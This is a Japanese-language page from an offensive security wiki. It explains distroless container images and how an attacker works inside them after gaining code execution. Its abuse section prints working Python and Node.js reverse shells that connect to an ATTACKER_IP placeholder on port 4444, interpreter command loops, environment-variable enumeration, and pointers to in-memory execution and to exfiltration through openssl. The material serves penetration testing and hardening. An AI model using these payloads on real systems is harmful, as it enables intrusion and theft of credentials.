# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## 概要

**distroless** container image は、特定のアプリケーションを実行するために必要な**最小限の runtime コンポーネント**を含み、通常のディストリビューションにある package manager、shell、大量の汎用 userland utility などを意図的に取り除いています。実際の distroless image に含まれるのは、多くの場合、アプリケーションの binary または runtime、shared library、certificate bundle、およびごく小さな filesystem 構成だけです。 <sup>[[1]](#references)</sup>

distroless は、新しい kernel isolation primitive というわけではありません。distroless は**image の設計戦略**です。container filesystem の**内部**で利用できるものを変えるのであり、kernel が container を隔離する方法を変えるものではありません。この違いは重要です。distroless は、攻撃者が code execution を得た後に利用できるものを減らすことで、主に環境を harden します。namespace、seccomp、capability、AppArmor、SELinux、その他の runtime isolation mechanism に取って代わるものではありません。

## Distroless が使われる理由

distroless image は主に、次のものを減らすために使われます。

- image のサイズ
- image の運用上の複雑さ
- vulnerability を含む可能性のある package や binary の数
- compromise 後に攻撃者がデフォルトで利用できる post-exploitation tool の数

そのため、distroless image は本番環境のアプリケーション deployment で広く使われています。shell、package manager、汎用 tool がほとんど含まれない container は、通常、運用上の把握が容易であり、侵害後に対話的に悪用されにくくなります。

よく知られた distroless 形式の image family の例は次のとおりです。

- Google の distroless image <sup>[[1]](#references)</sup>
- Chainguard の hardened/minimal image <sup>[[2]](#references)</sup>

## Distroless が意味しないこと

distroless container は、次のようなものでは**ありません**。

- 自動的に rootless になる
- 自動的に non-privileged になる
- 自動的に read-only になる
- seccomp、AppArmor、SELinux によって自動的に保護される
- container escape から自動的に保護される

distroless image を `--privileged`、host namespace の共有、危険な bind mount、または runtime socket の mount と組み合わせて実行することは可能です。そのような場合、image が最小限であっても、container は依然として極めて危険な状態になり得ます。distroless が変えるのは**userland の attack surface**であり、**kernel の trust boundary**ではありません。

## 一般的な運用上の特徴

distroless container を compromise すると、まずよくある前提が通用しなくなっていることに気づきます。`sh`、`bash`、`ls`、`id`、`cat` がない場合があり、場合によっては、普段の tradecraft が想定するような動作をする libc ベースの環境さえありません。tool がないことは、debugging、incident response、post-exploitation のやり方を変えるため、offense と defense の両方に影響します。

よく見られるパターンは次のとおりです。

- アプリケーションの runtime はあるが、それ以外はほとんどない
- shell がないため、shell ベースの payload は失敗する
- helper binary がないため、一般的な enumeration のワンライナーは失敗する
- read-only rootfs や、書き込み可能な tmpfs の場所に設定された `noexec` など、filesystem の保護もよく使われている

こうした要素が重なることで、一般に「distroless の weaponize」と呼ばれる状況につながります。

## Distroless と Post-Exploitation

distroless 環境での主な攻撃上の課題は、必ずしも最初の RCE とは限りません。その後の対応であることがよくあります。Python、Node.js、Java、Go などの言語 runtime で code execution が可能になった場合、任意の処理を実行できるかもしれません。しかし、他の Linux target で一般的な、shell 中心の通常の手法は使えません。

そのため、post-exploitation は次の3つの方向のいずれかに移ることがよくあります。

1. **既存の言語 runtime を直接使う**ことで、環境を enumeration し、socket を開き、file を読み、追加の payload を stage する。
2. filesystem が read-only、または書き込み可能な場所が `noexec` で mount されている場合は、**tool をメモリ上に持ち込む**。
3. アプリケーションやその dependency に予想外に有用なものが含まれている場合は、**image にすでに存在する binary を悪用する**。

## Abuse

### すでに利用できる Runtime を Enumeration する

多くの distroless container には shell がありませんが、アプリケーションの runtime は残っています。target が Python service なら Python があり、Node.js なら Node.js があります。これだけで、`/bin/sh` を一度も呼び出さずに file の enumeration、環境変数の読み取り、reverse shell の起動、メモリ上での実行の準備を行えることがよくあります。

Python を使った簡単な例:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Node.jsを使った簡単な例:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

影響:

- 環境変数の取得。多くの場合、認証情報やサービスエンドポイントが含まれる
- `/bin/ls` を使わないファイルシステムの列挙
- 書き込み可能なパスやマウントされた secrets の特定

### `/bin/sh` のない対話型ランタイム

イメージに `sh` や `bash` が含まれていない場合、従来のシェルベースの reverse shell は失敗します。その場合は、存在しないシェルを起動する代わりに、インストール済みの言語ランタイムで対話型セッションを公開します。

たとえば、次の Python payload は、対話型の Python コンソールをソケット経由でリダイレクトします。

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

同等のNode.jsアプローチでは、ソケット経由で受信したJavaScriptを評価できます。これはJavaScript REPLであり、オペレーティングシステムのシェルではありません。ファイルシステム、プロセス、ネットワークの操作は、NodeのAPIを通じて実行する必要があります。

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

どちらの例も外部への接続性と利用可能なインタープリターを必要とし、インタープリターが提供する機能のみを利用できます。

イメージに予期せず `/bin/sh` が含まれている場合は、従来のインタープリターを介した shell payload も引き続き有用です。これらは真に shell を使わないものではないため、別に示します。

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

古い Python の command-loop パターンは、`/bin/sh` は存在するものの、対話型 PTY の利用が不便な場合にも有用です。ここでは、実際の依存関係を明示して残しています。`subprocess.run(..., shell=True)` はシステムシェルを呼び出すため、**no-shell 技法ではありません**。

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### 完全な例: ShellなしのPythonコマンドループ

イメージにPythonはあるもののShellがまったくない場合でも、ローカルのPython REPLを使ってファイルシステム、環境、ネットワークを調査できます。

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

このループは`/bin/sh`を起動しません。Pythonの式や文を直接評価するため、操作にはshellコマンドではなくPython APIを使う必要があります。この制約はありますが、基本的なshellがもたらす効果の多くを実現できます。たとえば、ファイルシステムや環境変数の列挙、データへのアクセス、ネットワーク通信、インストール済みランタイムを使った追加payloadの配置などが可能です。

### インメモリでのツール実行

Distrolessイメージは、次の設定と組み合わせられることがよくあります。

- `readOnlyRootFilesystem: true`
- 書き込み可能だが`noexec`のtmpfs（`/dev/shm`など）
- パッケージ管理ツールがない

この組み合わせでは、「バイナリをディスクにダウンロードして実行する」という従来の手法は確実に機能しません。こうした場合、メモリ上で実行する手法が主な解決策になります。

専用ページはこちらです。

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

特に関連性の高い手法は次のとおりです。

- スクリプトランタイム経由の`memfd_create` + `execve` <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Python、Node.js、PHPのサービスでは、テンプレートインジェクション、プロトタイプ汚染、安全でない評価など、アプリケーションの脆弱性が侵入の起点になる可能性があります。それによってプロセス内でコード実行が可能になれば、`/proc/self/mem`を使う手法で、shellやディスク上の実行可能ファイルを介さずにloaderを実行できる場合があります。実行権限は引き続きコンテナプロセスのidentityのものです。コンテナからの脱出には、別途ランタイムまたはホスト境界の脆弱性が必要です。前提条件については、[read-only/noexec/distrolessの手法](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md)を参照してください。

### イメージ内にすでにあるバイナリ

一部のDistrolessイメージには、運用上必要なバイナリが含まれており、侵害後に役立つことがあります。よく確認される例は`openssl`です。アプリケーションが暗号化やTLS関連の処理に必要とすることがあるためです。

簡単な検索パターンは次のとおりです。

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

`openssl` が存在する場合、次の用途に使える可能性があります。

- outbound TLS 接続
- 許可された egress channel を介したデータの exfiltration
- encoded/encrypted blob を介した payload data の staging

具体的な悪用方法は実際にインストールされているものによって異なりますが、基本的な考え方は、distroless は「ツールがまったくない」という意味ではなく、「通常の distribution image よりもツールがはるかに少ない」ということです。

## 確認項目

これらの確認項目の目的は、実際にその image が distroless であるか、また post-exploitation に利用できる runtime や helper binary が残っているかを判断することです。

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

ここで興味深い点:

- shell が存在しなくても、Python や Node などのランタイムがあれば、post-exploitation ではランタイムを利用した実行に切り替えるべきです。
- root ファイルシステムが読み取り専用で、`/dev/shm` は書き込み可能だが `noexec` の場合、メモリ実行テクニックがより重要になります。
- `openssl`、`busybox`、`java` などのヘルパーバイナリがあれば、さらなるアクセスを開始するのに十分な機能を提供する可能性があります。

## ランタイムのデフォルト

| イメージ / プラットフォームの形式 | デフォルト状態 | 典型的な動作 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Google distroless 形式のイメージ | 設計上、最小限のユーザーランド | shell なし、パッケージマネージャーなし、アプリケーション / ランタイムの依存関係のみ | デバッグレイヤーやサイドカーの shell を追加する、busybox やツールをコピーする |
| Chainguard minimal イメージ | 設計上、最小限のユーザーランド | パッケージの種類を削減し、多くの場合、単一のランタイムまたはサービスに特化 | `:latest-dev` や debug バリアントを使う、ビルド時にツールをコピーする |
| distroless イメージを使う Kubernetes ワークロード | Pod の設定による | distroless が影響するのはユーザーランドのみ。Pod のセキュリティ態勢は、引き続き Pod spec とランタイムのデフォルトに依存する | 一時的なデバッグコンテナを追加する、ホストマウントを使う、Pod を privileged に設定する |
| distroless イメージを実行する Docker / Podman | 実行フラグによる | ファイルシステムは最小限だが、ランタイムのセキュリティは引き続きフラグとデーモンの設定に依存する | `--privileged`、ホスト名前空間の共有、ランタイムソケットのマウント、ホストの書き込み可能な bind mount |

重要なのは、distroless は**イメージの特性**であり、ランタイムによる保護ではないという点です。その価値は、侵害後にファイルシステム内で利用できるものを減らすことにあります。ビルドツールを最終イメージに含めないために、マルチステージビルドがよく使われます。 <sup>[[3]](#references)</sup>

## 関連ページ

distroless 環境でよく必要となる、ファイルシステムとメモリ実行のバイパスについて:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

distroless ワークロードにも当てはまる、コンテナランタイム、ソケット、マウントの悪用について:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Distrolessコンテナイメージ](https://github.com/GoogleContainerTools/distroless)
- [2] [Chainguard Images ドキュメント](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - マルチステージビルド](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Linuxマニュアルページ](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
